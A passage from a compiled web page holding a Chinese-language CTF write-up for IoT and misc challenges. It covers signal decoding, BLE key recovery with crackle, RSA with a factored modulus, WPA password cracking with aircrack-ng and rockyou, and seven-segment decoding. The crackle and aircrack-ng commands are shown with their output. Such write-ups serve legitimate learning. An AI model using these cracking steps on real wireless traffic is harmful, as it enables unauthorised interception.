lse",children:"#"}),"IoT-1 Cyber Pulse"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:["\u60F3\u4E0D\u5230\u5C45\u7136\u662F\u4E2A\u539F\u9898\u3002\u3002\u3002",(0,i.jsx)(n.a,{href:"https://ctftime.org/writeup/34125",target:"_blank",rel:"noopener noreferrer",children:"https://ctftime.org/writeup/34125"})]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u5148\u7528Logic2\u6253\u5F00\u6587\u4EF6\uFF0C\u7136\u540E\u5BFC\u51FA\u4E3Acsv\u683C\u5F0F"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"Logic2",src:s})}),"\n",(0,i.jsx)(n.p,{children:"\u5199\u4E2A\u7A0B\u5E8F\u5206\u6790\u4E00\u4E0B\u5206\u5E03"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u5206\u5E03\u56FE",src:a})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u540E\u8F93\u51FAflag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",meta:"",children:"import numpy as np\nfrom matplotlib import pyplot as plt\n\nsig = np.genfromtxt('digital.csv', delimiter=',', skip_header=0)\nvalues = np.diff(sig[:, 0]) * 1000\n\nplt.figure()\nplt.plot(values[2:-1])\nplt.savefig('signal_plot.png')\nplt.close()\n\nrounded_values = np.round(values[::2])\nint_values = np.floor(values[::2])\nceil_values = int_values + 1\n\nfor v in [rounded_values, int_values, ceil_values]:\n    print(''.join([chr(int(x)) for x in v[1:]]))\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u7ED3\u679C",src:c})}),"\n",(0,i.jsxs)(n.h3,{id:"iot-2-debug",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#iot-2-debug",children:"#"}),"IoT-2 Debug"]}),"\n",(0,i.jsx)(n.p,{children:"hint\u7ED9\u4E86\u63D0\u793A\uFF0C\u89E3\u538Bsal\u6587\u4EF6\uFF0C\u4ECEjson\u91CC\u641C\u7D22\uFF0C\u627E\u5230\u4E86saleae\u516C\u53F8\u4E0B\u7684Logic2\u8F6F\u4EF6\u53EF\u4EE5\u6253\u5F00\u8BE5\u6587\u4EF6\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7528\u8BE5\u8F6F\u4EF6\u5206\u6790\u6570\u636E\uFF0C\u62FC\u63A5\u5B57\u7B26\u4E32\u5F97\u5230flag\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"Logic2",src:l})}),"\n",(0,i.jsxs)(n.h3,{id:"iot-3-pcb",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#iot-3-pcb",children:"#"}),"IoT-3 PCB"]}),"\n",(0,i.jsx)(n.p,{children:"\u627E\u8F6F\u4EF6\u627E\u4E86\u597D\u4E45\u3002\u3002\u3002\u7FA4\u91CC\u5927\u4F6C\u63D0\u793A\u4E86\u4E00\u4E2A\u3010\u5609\u7ACB\u521BCAM\u3011\uFF08\u5410\u69FD\u4E00\u4E0B\u5C45\u7136\u8FD8\u8981\u624B\u673A\u9A8C\u8BC1\u7801\u767B\u5F55\uFF09\uFF0C\u627E\u4E86\u4E2AWindows\u7535\u8111\u5B89\u88C5\u4E86\u4E00\u4E0B\uFF0C\u8F7D\u5165zip\u538B\u7F29\u5305\u3002\u5728\u4E09\u4E2A\u56FE\u5C42\u91CC\u6709flag\u4FE1\u606F\u3002\uFF08\u4ECE0\u5F00\u59CB\u7684PCB\u5165\u95E8\uFF09"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u5609\u7ACB\u521BCAM",src:d})}),"\n",(0,i.jsxs)(n.h3,{id:"iot-4-ble1",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#iot-4-ble1",children:"#"}),"IoT-4 BLE1"]}),"\n",(0,i.jsxs)(n.p,{children:["\u627E\u5230\u4F4E\u529F\u8017\u84DD\u7259\u7684LTK\u3002\u4F7F\u7528\u5DE5\u5177\u7834\u89E3\u5373\u53EF\u3002",(0,i.jsx)(n.a,{href:"https://github.com/mikeryan/crackle",target:"_blank",rel:"noopener noreferrer",children:"https://github.com/mikeryan/crackle"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"# sumy @ SumyDeMBP in ~/Downloads\n$ crackle -i BLE01.pcapng\nWarning: No output file specified. Decrypted packets will be lost to the ether.\nFound 1 connection\n\nAnalyzing connection 0:\n  62:1f:33:cb:c4:c2 (random) -> 98:22:ef:20:9f:53 (public)\n  Found 28 encrypted packets\n  Cracking with strategy 0, 20 bits of entropy\n\n  !!!\n  TK found: 338467\n  !!!\n\n  Decrypted 26 packets\n  LTK found: f39372ca0af932321a6690566c898cd9\n\nSpecify an output file with -o to decrypt packets!\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"iot-5-ble3",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#iot-5-ble3",children:"#"}),"IoT-5 BLE3"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u786E\u5B9E\u4E0D\u96BE\uFF0C\u5C31\u662F\u5DE5\u5177\u6CA1\u627E\u5230\uFF0C\u5361\u4E86\u597D\u4E45\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7528wireshark\u6253\u5F00\u6570\u636E\u5305\u6587\u4EF6\uFF0C\u8FC7\u6EE4\u6761\u4EF6\u8F93\u5165btatt\uFF0C\u9996\u5148\u770B\u53D1\u9001\u7684\u57FA\u672C\u4FE1\u606F\u3002\u679A\u4E3EBLE\u7684handler\uFF0C\u4E0D\u505C\u8BFB\u53D6\u5176\u4E2D\u7684\u4FE1\u606F\uFF0C\u770B\u5230\u4E86\u4E00\u4E2A\u91CC\u9762\u6709\u5047\u7684flag\uFF0C\u63D0\u4EA4\u4E0A\u53BB\u80AF\u5B9A\u4E0D\u662F\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"wireshark",src:o})}),"\n",(0,i.jsx)(n.p,{children:"btatt\u91CC\u6CA1\u6709\u6709\u7528\u7684\u4FE1\u606F\uFF0C\u770B\u4E86\u4E0B\u5916\u9762\u5176\u4F59\u4FE1\u606F\uFF0C\u53D1\u73B0\u6587\u4EF6\u6700\u540E\u6709\u4E00\u6BB5\u914D\u5BF9\u4EA4\u6362\u548C\u52A0\u5BC6\u4F20\u8F93\u7684\u8FC7\u7A0B\u3002\u5F00\u59CB\u8003\u8651\u600E\u4E48\u89E3\u5BC6\u8FD9\u4E2A\u6570\u636E\u5305\u3002"}),"\n",(0,i.jsx)(n.p,{children:"============================\u5361\u4E86\u597D\u4E45\u5206\u5272\u7EBF===================="}),"\n",(0,i.jsx)(n.p,{children:"\u7EE7\u7EED\u4F7F\u7528crackle\u89E3\u5BC6\uFF0C\u53D1\u73B0\u4E0D\u652F\u6301\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"$ crackle -i BLE03.pcapng\nWarning: No output file specified. Decrypted packets will be lost to the ether.\nFrames inside PCAP file not supported ! dlt_name=BLUETOOTH_LE_LL\nFrames format supported:\n [256] BLUETOOTH_LE_LL_WITH_PHDR\n [192] PPI\n [157] NORDIC_BLE_SNIFFER_META\n [272] NORDIC_BLE\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u7EE7\u7EED\u627E\uFF0C\u6709\u4EBA\u63D0\u5230\u4E86\u600E\u4E48\u89E3\u5BC6BLUETOOTH_LE_LL\u3002",(0,i.jsx)(n.a,{href:"https://github.com/arunima06/crackle",target:"_blank",rel:"noopener noreferrer",children:"https://github.com/arunima06/crackle"})," \u4F46\u662F\u4EE3\u7801\u6CA1\u6709\u5408\u5165master\u3002\u7528\u5B83\u63D0\u4F9B\u7684\u5DE5\u5177\u8FDB\u884C\u89E3\u5BC6\u3002\u6210\u529F\u83B7\u53D6\u4E86\u89E3\u5BC6\u6570\u636E\u5305\u6587\u4EF6\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"$ ./crackle -i ~/Downloads/BLE03.pcapng -o ~/Downloads/BLE03.decrypted.pcap\nPCAP contains [BLUETOOTH_LE_LL] frames\nFound 1 connection\n\nAnalyzing connection 0:\n  75:48:3c:00:4a:a5 (random) -> f6:c5:05:1c:dd:ec (random)\n  Found 28 encrypted packets\n  Cracking with strategy 0, 20 bits of entropy\n\n  !!!\n  TK found: 364095\n  !!!\n\n  Decrypted 27 packets\n  LTK found: ba011ff2ee65f868cc2c343aacf3fde7\n\nDecrypted 27 packets, dumping to PCAP\nDone, processed 737 total packets, decrypted 27\n"})}),"\n",(0,i.jsx)(n.p,{children:"wireshark\u6253\u5F00\uFF0C\u7FFB\u627E\u6700\u540E\u7684\u8BF7\u6C42\uFF0C\u53D1\u73B0\u4E24\u6BB5flag\u3002flag{3dbd26cb04d9ae7b8c89628c032ee7d2}"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.img,{alt:"flag-1",src:p}),"\n",(0,i.jsx)(n.img,{alt:"flag-2",src:h})]}),"\n",(0,i.jsxs)(n.h3,{id:"iot-8-ble2",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#iot-8-ble2",children:"#"}),"IoT-8 BLE2"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u7684\u6B65\u9AA4\u6709\u70B9\u591A\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7528wireshark\u6253\u5F00\u6570\u636E\u5305\u6587\u4EF6\u3002\u8FC7\u6EE4\u6761\u4EF6\u8F93\u5165btatt\uFF0C\u8FD9\u91CC\u53EA\u5173\u6CE8\u6570\u636E\u4F20\u8F93\u7684\u76F8\u5173Frame\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"ble_wireshark",src:x})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"public_key",src:m})}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u4E2D\u95F4\u90E8\u5206\u53D1\u73B0\u4E86\u4E00\u4E2A\u516C\u94A5\u7684\u5F00\u5934\uFF0C\u540E\u9762\u7684\u4E24\u4E2A\u6570\u636E\u5305\u90FD\u662F\u5728\u4F20\u8F93\u516C\u94A5\u3002\u5C06\u4E24\u4E2A\u6570\u636E\u5305\u7684\u516C\u94A5\u63D0\u53D6\u51FA\u6765\u5907\u7528\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5408\u7406\u731C\u6D4B\u4E00\u4E0B\uFF0C\u63A5\u4E0B\u6765\u80AF\u5B9A\u8981\u4F20\u8F93\u516C\u94A5\u52A0\u5BC6\u540E\u7684\u5BC6\u6587\u4E86\u3002\u628A\u6240\u6709\u7684Send Write Request\u7684\u6570\u636E\u5185\u5BB9\u63D0\u53D6\u51FA\u6765\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"request",src:g})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u91CC\u5B58\u6210hex\u5B57\u7B26\u4E32\u5907\u7528"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"2ee76ad6ff3d3770dfeccfa2a55554941f1bd64fe7b002bb2fc7c318a60da5ad94b3e1c73571dabc38450d8807b81ee136d4367bacbad77f023c8d428381ae0b24cf92a170c84deb71b78fb24e0dfe9a16980c39d7482d5b8db8eb3fd147ffda193f1154d9f8e32212494005f8ad9f3089c6c4d30bddb964a999ccfa10dfd8b0\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u4E0B\u4E00\u6B65\u9700\u8981\u89E3\u5BC6\u8FD9\u4E2A\u5B57\u7B26\u4E32\u6570\u636E\u3002\u8FD9\u91CC\u6D89\u53CA\u5230\u516C\u94A5\u89E3\u5BC6\u7684\u7B97\u6CD5\uFF0C\u9700\u8981\u627E\u5230\u51E0\u4E2A\u53C2\u6570\uFF1A"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\u83B7\u53D6\u516C\u94A5\u7684\u57FA\u672C\u4FE1\u606F\n",(0,i.jsx)(n.img,{alt:"\u83B7\u53D6\u516C\u94A5\u4FE1\u606F",src:u})]}),"\n",(0,i.jsxs)(n.li,{children:["\u5C06n\u8F6C\u621010\u8FDB\u5236\uFF0C\u5728\u7F51\u7AD9\u4E0A ",(0,i.jsx)(n.a,{href:"http://factordb.com/index.php?id=1100000001582802043",target:"_blank",rel:"noopener noreferrer",children:"http://factordb.com/index.php?id=1100000001582802043"})," \u5206\u89E3\u5F97\u5230p\u548Cq\u3002\n",(0,i.jsx)(n.img,{alt:"\u5927\u6570\u5206\u89E3",src:f})]}),"\n",(0,i.jsx)(n.li,{children:"\u5C06\u83B7\u5F97\u7684\u6240\u6709\u53C2\u6570\u4EE3\u5165\u516C\u5F0F\u4E2D\uFF0Cc\u662F\u9700\u8981\u89E3\u5BC6\u7684\u5BC6\u6587\u3002\u6700\u7EC8\u5F97\u5230flag\u3002\uFF08\u5176\u5B9E\u4E0D\u60F3\u7528python\u7684\uFF0C\u4F46\u662F\u62B5\u4E0D\u4F4Fpython\u5904\u7406\u5927\u6570\u771F\u7684\u5F88\u65B9\u4FBF\uFF09"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",meta:"",children:'import libnum\n\nn = 143000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007088000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000079569\np = 11000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000189\nq = 13000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000421\ne = 65537\n\nphi = (p - 1) * (q - 1)\nd = libnum.invmod(e, phi)\n\nc = int(\n    "2ee76ad6ff3d3770dfeccfa2a55554941f1bd64fe7b002bb2fc7c318a60da5ad94b3e1c73571dabc38450d8807b81ee136d4367bacbad77f023c8d428381ae0b24cf92a170c84deb71b78fb24e0dfe9a16980c39d7482d5b8db8eb3fd147ffda193f1154d9f8e32212494005f8ad9f3089c6c4d30bddb964a999ccfa10dfd8b0",\n    16)\nm = pow(c, d, n)\nprint(libnum.n2s(m))\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u7ED3\u679C",src:b})}),"\n",(0,i.jsxs)(n.h3,{id:"iot-9-\u4F60\u7684wi-fi\u6D41\u91CF\u88AB\u76D1\u542C\u4E86\u4E48",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#iot-9-\u4F60\u7684wi-fi\u6D41\u91CF\u88AB\u76D1\u542C\u4E86\u4E48",children:"#"}),"IoT-9 \u4F60\u7684Wi-Fi\u6D41\u91CF\u88AB\u76D1\u542C\u4E86\u4E48\uFF1F"]}),"\n",(0,i.jsx)(n.p,{children:"\u7ED9\u4E86\u4E00\u4E2Apcap\u6587\u4EF6\uFF0C\u7B2C\u4E00\u6B21\u73A9\u6D41\u91CF\u5206\u6790\uFF0C\u4E00\u6B65\u4E00\u5751\u7684\u89E3\u51B3\u4E86\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7528Wireshark\u6253\u5F00\u6587\u4EF6\uFF0C\u4EE5\u4E3A\u76F4\u63A5\u627EHTTP\u534F\u8BAE\uFF0C\u53D1\u73B0\u4E0D\u884C\u3002\u90FD\u662F802.11\u534F\u8BAE\u3002\u67E5\u627E\u53D1\u73B0\u662F\u4E0Ewifi\u8BBE\u5907\u901A\u4FE1\u7684\u534F\u8BAE\uFF0C\u88AB\u52A0\u5BC6\u4E86\uFF0C\u9700\u8981\u83B7\u53D6\u89E3\u5BC6\u5BC6\u94A5\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u91CC\u7528Aircrack-ng\u8FDB\u884C\u7206\u7834"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"brew install aircrack-ng\naircrack-ng -1 -a 2 -b 28:ed:e0:62:52:d6 ./monitorAP.pcap -w ./rockyou.txt\n# -b \u540E\u9762\u662Fwifi\u7684BSSID\uFF0C\u5927\u90E8\u5206\u94FE\u63A5\u7684\u90FD\u662FmiCTF\uFF0Cwireshark->wireless->WLAN Traffic\u53EF\u4EE5\u67E5\u8BE2\u5230\n# -a \u6253\u8868\u52A0\u5BC6\u7C7B\u578B\uFF0C1:WEP 2:WPA-PSK\n# -w \u9700\u8981\u4E00\u4E2A\u5B57\u5178\uFF0C\u4ECE\u7F51\u4E0A\u627E\u4E86\u4E00\u4E2A\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7206\u7834\u627E\u5230\u5BC6\u7801"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"aircrack-ng\u7206\u7834",src:j})}),"\n",(0,i.jsx)(n.p,{children:"\u627E\u5230\u5BC6\u7801\u4E86\u4E4B\u540E\u53EF\u4EE5\u7528wireshark->Frame\u4E0A\u53F3\u952E->...->\u8F93\u5165\u89E3\u5BC6\u5BC6\u94A5\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u8F93\u5165\u5BC6\u94A5",src:A})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u5BC6\u94A5\u662Fxxxx",src:w})}),"\n",(0,i.jsx)(n.p,{children:"\u63A5\u4E0B\u6765wireshark\u4F1A\u81EA\u52A8\u89E3\u5BC6\u8BF7\u6C42\u3002\u7136\u540E\u5F00\u59CB\u627E\u53EF\u7591\u8BF7\u6C42\uFF0C\u5148\u4ECEHTTP\u534F\u8BAE\u5F00\u59CB\u627E\uFF0C\u56E0\u4E3A\u6700\u5BB9\u6613\u8FA8\u8BA4\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u53EF\u7591\u7684\u8BF7\u6C42",src:v})}),"\n",(0,i.jsx)(n.p,{children:"\u53EF\u4EE5\u770B\u5230\u6709\u4E00\u4E2A\u53D1\u9001\u7684POST\u8BF7\u6C42\uFF0C\u91CC\u9762\u6709\u53EF\u7591\u7684flag\uFF0C\u4F46\u662F\u76F4\u63A5\u63D0\u4EA4\u4E0A\u53BB\u6CA1\u6709\u901A\u8FC7\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u731C\u6D4B\u53EF\u80FD\u88AB\u52A0\u5BC6\u4E86\uFF0C\u56E0\u4E3AEncrypted=1\u3002\u7528Base64\u89E3\u5BC6\uFF0C\u83B7\u53D6\u5230\u4E86\u8FD8\u7B97\u201C\u6B63\u5E38\u201D\u7684flag\uFF0C\u63D0\u4EA4\u901A\u8FC7\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"iot-10-7-segment",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#iot-10-7-segment",children:"#"}),"IoT-10 7 segment"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u662F\u4E00\u4E2A\u7EFC\u5408\u7684\u9898\u76EE\uFF0C\u7ED3\u5408\u4E86\u524D\u9762\u7684\u4FE1\u53F7\u5206\u6790\u548CPCB\u67E5\u770B\u3002"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u5F00\u59CB\u8FD8\u4E0D\u77E5\u90537 segment\u662F\u4EC0\u4E48\u610F\u601D\uFF0C\u540E\u6765\u53C8\u67E5\u4E86\u4E00\u4E0B\u53EB\u4E03\u6BB5\u6570\u7801\u7BA1\uFF0C\u5C31\u662F\u8BA1\u7B97\u5668\u90A3\u79CD\u5C55\u793A\u65B9\u5F0F\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u7ED9\u4E86\u4E00\u4E2Asal\u6587\u4EF6\u548CPCB\u56FE\u7EB8\u3002\u5148\u770BPCB\u56FE\u7EB8\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"PCB\u56FE\u7EB8",src:y})}),"\n",(0,i.jsx)(n.p,{children:"\u662F\u4E00\u4E2A\u201C\u8377\u9B6F\u65AF\u4E4B\u773C\u201D\u7684\u6807\u8BC6\uFF0C\u91CC\u9762\u6709\u7EBF\u8DEF\uFF0C\u7EBF\u8DEF\u8FDE\u63A5\u7740\u51E0\u4E2A\u8F93\u5165\u70B9\u3002\u5BF9\u7167\u7F51\u4E0A\u7684\u5F15\u811A\u56FE\uFF0C\u53EF\u4EE5\u628A\u8F93\u5165\u70B9\u548C\u5BF9\u5E94\u663E\u793A\u7684\u7EBF\u6BB5\u6807\u8BC6\u51FA\u6765\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u5F15\u811A",src:C})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u624B\u7ED8",src:T})}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540E\u770B\u4FE1\u53F7\u6587\u4EF6\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u4FE1\u53F7",src:k})}),"\n",(0,i.jsx)(n.p,{children:"\u5BF9\u7167\u4FE1\u53F7\u6587\u4EF6\u628A\u9AD8\u4F4E\u7535\u5E73\u627E\u51FA\u6765\uFF0C\u7136\u540E\u6839\u636E\u63A5\u53E3\u548C\u7EBF\u6BB5\u7684\u5BF9\u5E94\u5173\u7CFB\uFF0C\u5C31\u80FD\u628A\u5C55\u793A\u7684\u6570\u5B57\u8FD8\u539F\u51FA\u6765\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u91CC\u624B\u52A8\u8FD8\u539F\u4E5F\u53EF\u4EE5\u3002\u5F53\u7136\u4F60\u4E5F\u53EF\u4EE5\u5199\u4E2A\u7A0B\u5E8F\u641C\u4E00\u4E0B\uFF0C\u5C31\u662F\u628A\u6570\u5B57\u5B57\u6BCD\u7F16\u7801\u548C\u5BF9\u5E94\u7684\u4FE1\u606F\u7684\u6392\u5217\u7EC4\u5408\u8BD5\u4E00\u4E0B\u3002\u628A\u90FD\u6EE1\u8DB3\u7684\u7ED3\u679C\u8F93\u51FA\u51FA\u6765\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'package com.sumygg.mictf2023.iot10\n\nval data = arrayOf(\n    "111101010011010101010101011011",\n//    "111111111111111111111111111111",\n    "111101011101111111011111111100",\n    "111101010011011111111101111010",\n    "111111111111110101110111010110",\n    "100110101100100000100110001110",\n    "111001010011011111001001111010",\n    "111001010011011111111001110000",\n)\n\nval digitMap = mapOf<String, String>(\n    "1111101" to "0",\n    "0101000" to "1",\n    "0110111" to "2",\n    "0101111" to "3",\n    "1101010" to "4",\n    "1001111" to "5",\n    "1011111" to "6",\n    "0101100" to "7",\n    "1111111" to "8",\n    "1101111" to "9",\n    "1111110" to "a",\n    "1011011" to "b",\n    "1010101" to "c",\n    "0111011" to "d",\n    "1010111" to "e",\n    "1010110" to "f",\n)\n\nfun check(used: IntArray) {\n    val sb = StringBuilder()\n    val digit = CharArray(7)\n    for (i in 0 until 29 ) {\n        for (j in 0 until data.size) {\n            digit[used[j]] = data[j][i]\n        }\n        val dig = digit.joinToString("")\n        if (digitMap.containsKey(dig)) {\n            sb.append(digitMap[dig]!!)\n        } else {\n//            println("not found for ${used.joinToString(",")}")\n            return\n        }\n    }\n    println(sb.toString())\n}\n\nfun dfs(used: IntArray, level: Int) {\n    if (level == 7) {\n        check(used)\n        return\n    }\n    for (i in 0 until used.size) {\n        if (used[i] < 0) {\n            used[i] = level\n            dfs(used, level + 1)\n            used[i] = -1\n        }\n    }\n}\n\nfun main() {\n    val used = IntArray(7) {\n        -1\n    }\n    dfs(used, 0)\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u540E\u4E00\u4E2A\u662F\u5E72\u6270\u9879\uFF0C\u641C\u7D22\u7684\u65F6\u5019\u6682\u65F6\u53BB\u6389\u4E86\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u6700\u7EC8\u8FD8\u539F\u51FA\u6765\u7684\u7684\u4FE1\u606F\u662F ",(0,i.jsx)(n.code,{children:"8663161677b676f6f645f376f627d_"})," \u3002\u8FD9\u4E2A\u660E\u663E\u662F\u52A0\u5BC6\u7684\u3002\u3002\u3002\u4F46\u662F\u4E0D\u77E5\u9053\u600E\u4E48\u89E3\u5BC6\u3002\u3002\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"======================\u5361\u4E86\u5F88\u4E45\u7684\u5206\u5272\u7EBF================="}),"\n",(0,i.jsxs)(n.p,{children:["\u671F\u95F4\u8BD5\u8FC7\u5F88\u591A\u79CD\u89E3\u5BC6\uFF0C\u90FD\u6CA1\u5565\u6548\u679C\u3002\u4E8E\u662F\u53C8\u628A\u90A3\u4E2A\u7F51\u7AD9\u627E\u51FA\u6765 ",(0,i.jsx)(n.a,{href:"https://www.dcode.fr/cipher-identifier",target:"_blank",rel:"noopener noreferrer",children:"https://www.dcode.fr/cipher-identifier"})," \u5224\u65AD\u4E00\u4E0B\u52A0\u5BC6\u65B9\u5F0F\u3002"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u731C\u6D4B\u89E3\u5BC6\u65B9\u5F0F",src:N})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u56DB\u79CD\u6982\u7387\u633A\u9AD8\u7684\uFF0C\u7EE7\u7EED\u5B9E\u9A8C\u3002\u5728\u8BD5\u5230\u73AF\u5F0F\u79FB\u4F4D\uFF08Circular Bit Shift\uFF09\u53D1\u73B0\u7ED3\u679C\u5F88\u50CF\u4E00\u4E2Aflag\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u5F88\u50CFflag",src:S})}),"\n",(0,i.jsx)(n.p,{children:"\u8C03\u6574\u79FB\u4F4D\u7684\u6570\u91CF\uFF0C\u6700\u7EC8\u53D1\u73B0flag\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u6700\u7EC8flag",src:L})}),"\n",(0,i.jsxs)(n.h2,{id:"misc",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc",children:"#"}),"Misc"]}),"\n",(0,i.jsxs)(n.h3,{id:"misc-1-\u7EA2\u7EBF\u7EA2\u7EBF\u7EA2\u7EBF",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-1-\u7EA2\u7EBF\u7EA2\u7EBF\u7EA2\u7EBF",children:"#"}),"misc-1 \u7EA2\u7EBF\uFF01\u7EA2\u7EBF\uFF01\u7EA2\u7EBF\uFF01"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6839\u636E\u63D0\u793A ",(0,i.jsx)(n.code,{children:"tomorrow is another day"})," \u53BBgithub\u4E0A\u641C\u7D22\uFF08\u4F60\u8BF4\u4E3A\u4EC0\u4E48\u4E0D\u5728gitlab\u91CC\u641C\u7D22\uFF1F\u516C\u53F8\u7684gitlab\u6709\u641C\u7D22\u5417\u3002\u3002\u3002\uFF09\uFF0C\n\u627E\u5230\u4E00\u4E2A\u4ED3\u5E93\uFF0C\u7FFB\u770B\u63D0\u4EA4\u8BB0\u5F55\uFF0C\u627E\u5230flag"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u641C\u7D22\u8BB0\u5F55",src:F})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"commit\u8BB0\u5F55",src:E})}),"\n",(0,i.jsxs)(n.h3,{id:"misc-2-\u6709\u8DA3\u7684\u524D\u7AEF",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-2-\u6709\u8DA3\u7684\u524D\u7AEF",children:"#"}),"misc-2 \u6709\u8DA3\u7684\u524D\u7AEF"]}),"\n",(0,i.jsx)(n.p,{children:"\u9875\u9762\u5199\u4E86\u4E00\u4E9B\u5B57\u7B26\uFF0C\u4E0D\u77E5\u9053\u505A\u4EC0\u4E48\u7684\uFF0C\u76F4\u63A5\u770B\u6E90\u7801"}),"\n",(0,i.jsxs)(n.p,{children:["\u6E90\u7801\u7684 ",(0,i.jsx)(n.code,{children:"<script>"})," \u91CC\u6709\u4E2A\u6CE8\u91CA\uFF0C\u5F88\u53EF\u7591\uFF0C\u62FF\u53BBbase64\u89E3\u7801"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"base64\u89E3\u7801",src:P})}),"\n",(0,i.jsxs)(n.p,{children:["\u76F4\u63A5\u653E\u5728\u7F51\u9875\u63A7\u5236\u53F0\u91CC\u6267\u884C\uFF0C\u5C45\u7136\u53EF\u4EE5\u6B63\u5E38\u6267\u884C\u3002\u3002\u3002\u6700\u540E\u67E5\u4E86\u4E00\u4E0B\uFF0C\u539F\u6765\u662F\u4E00\u4E2A\u53EBjjencode\u7684\u7F16\u7801\u65B9\u5F0F\uFF0C\u627E\u4E86\u4E2A\u89E3\u7801\u7F51\u7AD9 